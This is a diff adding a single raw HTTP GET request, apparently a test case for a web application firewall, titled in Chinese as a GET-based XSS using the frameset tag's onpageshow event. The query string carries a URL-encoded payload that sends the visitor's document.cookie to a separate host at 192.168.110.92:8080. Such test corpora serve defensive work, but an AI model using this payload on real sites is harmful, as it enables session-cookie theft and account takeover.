@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_frameset标签-06506816
+# 通过 <FRAMESET> 和 onpageshow 执行 JavaScript，<FRAMESET> 元素在浏览器上无需用户交互即可触发“onpageshow”事件。
+GET /?id=%3Cframeset%20onpageshow=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3E&bid=hd_tag_m8mv2516 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2516
+RM-PRO-Token: 8422c36d8486de18e55b46fbf8d24d46
+RM-PRO-Time: 1742808429978
+User-Agent: curl/7.83.1
+
